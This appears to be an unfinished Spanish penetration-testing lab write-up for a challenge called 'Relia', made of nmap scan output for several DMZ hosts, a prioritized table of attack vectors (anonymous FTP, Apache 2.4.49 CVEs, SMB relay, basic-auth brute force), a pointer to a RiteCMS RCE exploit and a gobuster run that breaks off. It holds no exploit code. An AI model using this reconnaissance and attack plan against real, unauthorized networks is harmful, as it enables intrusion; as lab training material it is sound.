# Challenge: Relia
## Fecha: 03/06/2025
## Host:[]
> El tercer octeto de la ip suele cambiar al reiniciar el laboratorio
## IPs:
```bash
# DMZ red 1 
192.168.231.249
192.168.231.248
192.168.231.247
192.168.231.246
192.168.231.245
192.168.231.191
192.168.231.189
192.168.231.250

# RELIA - interna red 2
172.16.191.6
172.16.191.21
172.16.191.19
172.16.191.15
172.16.191.30
172.16.191.14
172.16.191.20
```
## Objetivo
{OBJETIVO}
## Herramientas
1. tool - 1 
2. tool - 2
## Procedimiento y comandos
#### Paso 1: Enumeracion de la DMZ
1. Enumeracion agresiva:
```bash
# Nmap 7.95 scan initiated Tue Jun  3 19:52:47 2025 as: /usr/lib/nmap/nmap -A -iL DMZ_ips.txt -oN enumerations/dmz-agresive.txt
Nmap scan report for 192.168.231.249
Host is up (0.15s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-03T22:55:19+00:00; -2s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: LEGACY
|   NetBIOS_Domain_Name: LEGACY
|   NetBIOS_Computer_Name: LEGACY
|   DNS_Domain_Name: LEGACY
|   DNS_Computer_Name: LEGACY
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:36+00:00
| ssl-cert: Subject: commonName=LEGACY
| Not valid before: 2025-06-02T21:40:45
|_Not valid after:  2025-12-02T21:40:45
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/7.4.30)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/7.4.30
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.231.249:8000/dashboard/
|_http-open-proxy: Proxy might be redirecting requests
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=41425%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=10
OS:5%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI=I%CI=I%TS=A)S
OS:EQ(SP=107%GCD=1%ISR=10E%TI=I%CI=I%TS=A)SEQ(SP=108%GCD=1%ISR=10A%TI=I%CI=
OS:I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%
OS:O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W
OS:6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD
OS:=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0
OS:%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=
OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T22:54:37
|_  start_date: N/A
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   196.74 ms 192.168.45.1
2   246.36 ms 192.168.45.254
3   156.65 ms 192.168.251.1
4   157.03 ms 192.168.231.249

Nmap scan report for 192.168.231.248
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-robots.txt: 16 disallowed entries (15 shown)
| /*/ctl/ /admin/ /App_Browsers/ /App_Code/ /App_Data/ 
| /App_GlobalResources/ /bin/ /Components/ /Config/ /contest/ /controls/ 
|_/Documentation/ /HttpModules/ /Install/ /Providers/
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Home
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXTERNAL
|   NetBIOS_Domain_Name: EXTERNAL
|   NetBIOS_Computer_Name: EXTERNAL
|   DNS_Domain_Name: EXTERNAL
|   DNS_Computer_Name: EXTERNAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:24+00:00
| ssl-cert: Subject: commonName=EXTERNAL
| Not valid before: 2025-06-02T21:40:44
|_Not valid after:  2025-12-02T21:40:44
|_ssl-date: 2025-06-03T22:55:19+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=33588%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=107%TI=I%CI=I%TS=A)SEQ(SP=10
OS:3%GCD=1%ISR=109%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%TS=A)S
OS:EQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=FD%GCD=1%ISR=FA%TI=I%CI=I%
OS:TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O5
OS:=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=
OS:FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2025-06-03T22:54:30
|_  start_date: N/A

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.94 ms 192.168.231.248

Nmap scan report for 192.168.231.247
Host is up (0.15s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
|_http-title: RELIA - New Hire Information
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.54 ((Win64) OpenSSL/1.1.1p PHP/8.1.10)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.10
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn: 
|_  http/1.1
|_http-title: RELIA - New Hire Information
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB02
| Not valid before: 2025-04-23T04:53:29
|_Not valid after:  2025-10-23T04:53:29
| rdp-ntlm-info: 
|   Target_Name: WEB02
|   NetBIOS_Domain_Name: WEB02
|   NetBIOS_Computer_Name: WEB02
|   DNS_Domain_Name: WEB02
|   DNS_Computer_Name: WEB02
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:32+00:00
|_ssl-date: 2025-06-03T22:55:20+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=37657%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=10
OS:6%GCD=1%ISR=104%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%TS=A)S
OS:EQ(SP=107%GCD=1%ISR=105%TI=I%CI=I%TS=A)SEQ(SP=FF%GCD=1%ISR=10A%TI=I%CI=I
OS:%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O
OS:5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T22:54:40
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   157.01 ms 192.168.231.247

Nmap scan report for 192.168.231.246
Host is up (0.16s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Code Validation
443/tcp  open  ssl/http Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=demo
| Subject Alternative Name: DNS:demo
| Not valid before: 2022-10-12T07:46:27
|_Not valid after:  2032-10-09T07:46:27
|_http-title: Code Validation
| tls-alpn: 
|_  http/1.1
2222/tcp open  ssh      OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 42:2d:8d:48:ad:10:dd:ff:70:25:8b:46:2e:5c:ff:1d (ECDSA)
|_  256 aa:4a:c3:27:b1:19:30:d7:63:91:96:ae:63:3c:07:dc (ED25519)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.95 ms 192.168.231.246

Nmap scan report for 192.168.231.245
Host is up (0.16s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      vsftpd 2.0.8 or later
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.239
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: RELIA Corp.
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
443/tcp  open  ssl/http Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-title: RELIA Corp.
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
| ssl-cert: Subject: commonName=web01.relia.com/organizationName=RELIA/stateOrProvinceName=Berlin/countryName=DE
| Not valid before: 2022-10-12T08:55:44
|_Not valid after:  2032-10-09T08:55:44
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| http-methods: 
|_  Potentially risky methods: TRACE
2222/tcp open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 30:0c:6c:9b:ac:07:47:5e:df:6d:ff:38:63:38:2a:fd (RSA)
|   256 f3:a9:70:76:c8:d4:c4:17:f4:39:1f:be:58:9d:1f:a5 (ECDSA)
|_  256 21:a0:79:82:2d:e6:2a:76:11:24:2f:7e:2e:a8:c7:83 (ED25519)
8000/tcp open  http     Apache httpd 2.4.49 ((Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.49 (Unix) OpenSSL/1.1.1f mod_wsgi/4.9.4 Python/3.8
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: Host: RELIA; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.90 ms 192.168.231.245

Nmap scan report for 192.168.231.191
Host is up (0.15s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: 401 - Unauthorized: Access is denied due to invalid credentials.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=192.168.231.191
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-03T22:55:18+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=login.relia.com
| Not valid before: 2025-06-02T21:40:52
|_Not valid after:  2025-12-02T21:40:52
| rdp-ntlm-info: 
|   Target_Name: RELIA
|   NetBIOS_Domain_Name: RELIA
|   NetBIOS_Computer_Name: LOGIN
|   DNS_Domain_Name: relia.com
|   DNS_Computer_Name: login.relia.com
|   DNS_Tree_Name: relia.com
|   Product_Version: 10.0.20348
|_  System_Time: 2025-06-03T22:54:31+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=80%CT=1%CU=34306%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=FE%TI=I%CI=I%TS=A)SEQ(SP=102
OS:%GCD=1%ISR=10F%TI=I%CI=I%TS=A)SEQ(SP=103%GCD=1%ISR=103%TI=I%CI=I%TS=A)SE
OS:Q(SP=104%GCD=1%ISR=10E%TI=I%CI=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I
OS:%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11%O
OS:5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
OS:=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-03T22:54:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1s, deviation: 0s, median: -2s

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.93 ms 192.168.231.191

Nmap scan report for 192.168.231.189
Host is up (0.15s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
110/tcp  open  pop3          hMailServer pop3d
|_pop3-capabilities: USER TOP UIDL
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp  open  imap          hMailServer imapd
|_imap-capabilities: OK QUOTA completed CHILDREN NAMESPACE CAPABILITY IDLE ACL RIGHTS=texkA0001 IMAP4rev1 SORT IMAP4
445/tcp  open  microsoft-ds?
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=25%CT=1%CU=35361%PV=Y%DS=4%DC=T%G=Y%TM=683F7D62
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=A)SEQ(SP=10
OS:2%GCD=1%ISR=10F%TI=I%CI=I%TS=A)SEQ(SP=107%GCD=1%ISR=10B%TI=I%CI=I%TS=A)S
OS:EQ(SP=10A%GCD=1%ISR=10C%TI=I%CI=I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11
OS:%O3=M578NW8NNT11%O4=M578NW8ST11%O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W
OS:2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW
OS:8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: MAIL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-03T22:54:53
|_  start_date: N/A

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.94 ms 192.168.231.189

Nmap scan report for 192.168.231.250
Host is up (0.15s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WINPREP
|   NetBIOS_Domain_Name: WINPREP
|   NetBIOS_Computer_Name: WINPREP
|   DNS_Domain_Name: WINPREP
|   DNS_Computer_Name: WINPREP
|   Product_Version: 10.0.22000
|_  System_Time: 2025-06-03T22:54:28+00:00
| ssl-cert: Subject: commonName=WINPREP
| Not valid before: 2025-05-01T05:00:28
|_Not valid after:  2025-10-31T05:00:28
|_ssl-date: 2025-06-03T22:55:20+00:00; -1s from scanner time.
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/3%OT=135%CT=1%CU=43383%PV=Y%DS=4%DC=T%G=Y%TM=683F7D6
OS:2%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=1
OS:03%GCD=1%ISR=10C%TI=I%CI=I%TS=A)SEQ(SP=103%GCD=1%ISR=10F%TI=I%CI=I%TS=A)
OS:SEQ(SP=104%GCD=1%ISR=10A%TI=I%CI=I%TS=A)SEQ(SP=105%GCD=1%ISR=10F%TI=I%CI
OS:=I%TS=A)OPS(O1=M578NW8ST11%O2=M578NW8ST11%O3=M578NW8NNT11%O4=M578NW8ST11
OS:%O5=M578NW8ST11%O6=M578ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%
OS:W6=FFDC)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M578NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%R
OS:D=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=
OS:0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID
OS:=G%RIPCK=G%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2025-06-03T22:55:00
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
-   Hops 1-3 are the same as for 192.168.231.249
4   156.90 ms 192.168.231.250

Post-scan script results:
| clock-skew: 
|   -1s: 
|     192.168.231.248
|     192.168.231.191
|_    192.168.231.249
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

## üìä An√°lisis superficie de ataque priorizado.

### Hosts Ordenados por Prioridad de Ataque

#### PRIORIDAD ALTA

| IP | Hostname | Servicios Cr√≠ticos | Puertos | Responsabilidad | Vectores de Ataque |
|---|---|---|---|---|---|
| 192.168.231.245 | RELIA | FTP (anon), HTTP, HTTPS, SSH | 21, 80, 443, 2222, 8000 | Web Server Principal | **FTP an√≥nimo**, Apache 2.4.49 (CVE conocidos), mod_wsgi Python, SSH en puerto no est√°ndar |
| 192.168.231.246 | demo | HTTP, HTTPS, SSH | 80, 443, 2222 | Servidor de Validaci√≥n | **Code Validation** app, SSH puerto no est√°ndar, posible upload/validation bypass |
| 192.168.231.249 | LEGACY | IIS, SMB, RDP, WinRM, XAMPP | 80, 135, 139, 445, 3389, 5985, 8000 | Servidor Legacy Windows | **XAMPP** dashboard, SMB shares, WinRM, m√©todo TRACE habilitado |

#### PRIORIDAD MEDIA

| IP | Hostname | Servicios Cr√≠ticos | Puertos | Responsabilidad | Vectores de Ataque |
|---|---|---|---|---|---|
| 192.168.231.247 | WEB02 | Apache, SMB, RDP, WinRM | 80, 135, 139, 443, 445, 3389, 5985 | Web Server Secundario | **RELIA New Hire Info**, PHP 8.1.10, SMB enumeration, cert expirado SSL |
| 192.168.231.248 | EXTERNAL | IIS, SMB, RDP, WinRM | 80, 135, 139, 445, 3389, 5985 | Servidor Externo | **robots.txt** con 16 entradas, SMB shares, WinRM, m√©todo TRACE |
| 192.168.231.191 | login.relia.com (LOGIN) | IIS, SMB, RDP, WinRM | 80, 135, 139, 445, 3389, 5985 | Servidor de Login | **HTTP Basic Auth**, dominio relia.com, SMB domain controller potencial |

#### PRIORIDAD BAJA

| IP | Hostname | Servicios Cr√≠ticos | Puertos | Responsabilidad | Vectores de Ataque |
|---|---|---|---|---|---|
| 192.168.231.189 | MAIL | SMTP, POP3, IMAP, SMB, WinRM | 25, 110, 135, 139, 143, 445, 587, 5985 | Servidor de Email | hMailServer, email enumeration, SMTP relay, SMB shares |
| 192.168.231.250 | WINPREP | SMB, RDP | 135, 139, 445, 3389 | Workstation/Prep | Windows 11 (build 22000), SMB shares, RDP |

### Vulnerabilidades Cr√≠ticas Identificadas

#### Inmediatas
- **192.168.231.245**: FTP an√≥nimo habilitado
- **192.168.231.249**: XAMPP dashboard expuesto en puerto 8000
- **192.168.231.191**: HTTP Basic Auth (posible brute force)

#### Apache Vulnerabilities
- **192.168.231.245**: Apache 2.4.49 - **CVE-2021-41773** (Path Traversal)
- **192.168.231.245**: Apache 2.4.49 - **CVE-2021-42013** (RCE)

#### Windows SMB
- Todos los hosts Windows tienen **SMB** sin firma requerida
- Posible **relay attacks** entre hosts del dominio

#### Estrategia de Enumeraci√≥n Recomendada

1. **Comenzar con 192.168.231.245**: FTP an√≥nimo + Apache vulnerable
2. **Enumerar 192.168.231.249**: XAMPP dashboard + SMB shares
3. **Verificar 192.168.231.246**: Aplicaci√≥n de validaci√≥n de c√≥digo
4. **SMB enumeration**: Todos los hosts Windows para shares y usuarios
5. **Web enumeration**: Dirb/Gobuster en todos los servicios HTTP/HTTPS

### Notas T√©cnicas

- **Dominio identificado**: relia.com
- **Sistemas operativos**: Mix Windows Server 2022 y Ubuntu
- **Puertos SSH no est√°ndar**: 2222 en hosts Linux
- **Certificados SSL**: Varios expirados o con CN incorrectos

Las pruebas sobre el servidor ftp dan como positivo el login anonimo pero los resultados **no ofrecen valor** _aun_.
No tenemos permisos para subir archivos, ni permisos de lectura de archivos.

Exploramos la posibilidad de Directory Traversal sin resultados.

Enumeramos directorios con gobuster y encontramos una ruta en **LEGACY** en el puerto 8000 que apunta a un cms **RiteCMS 3**
buscamos en [Exploit Database](https://www.exploit-db.com/exploits/50616) y encontramos un exploit para lograr **RCE** desde un usuario autenitcado.


```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali]
‚îî‚îÄ# gobuster dir -u http://192.168.161.249:8000/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.161.249:8000/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
